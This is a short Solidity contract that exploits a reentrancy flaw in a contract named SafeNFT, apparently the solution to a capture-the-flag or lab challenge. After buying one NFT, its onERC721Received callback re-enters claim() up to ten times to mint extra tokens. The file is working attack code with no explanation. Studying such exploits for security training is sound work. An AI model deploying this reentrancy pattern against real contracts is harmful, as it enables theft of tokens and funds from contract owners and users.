// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import {SafeNFT} from "./Claim.sol";

import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

contract SafeNftAttacker is IERC721Receiver {
    SafeNFT public target;
    uint public counter;

    constructor(address _targetAddress)  {
        target = SafeNFT(_targetAddress);
    }

    function attackSafeNFT(uint price) external payable {

        bytes memory payloadData = abi.encodeWithSignature("buyNFT()");
        (bool success, ) = address(target).call{value: price}(payloadData);
        target.claim();
    }

    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external override returns (bytes4){

        if (counter < 10){
            counter++;
            target.claim();
    }
        return this.onERC721Received.selector;
        }
        
}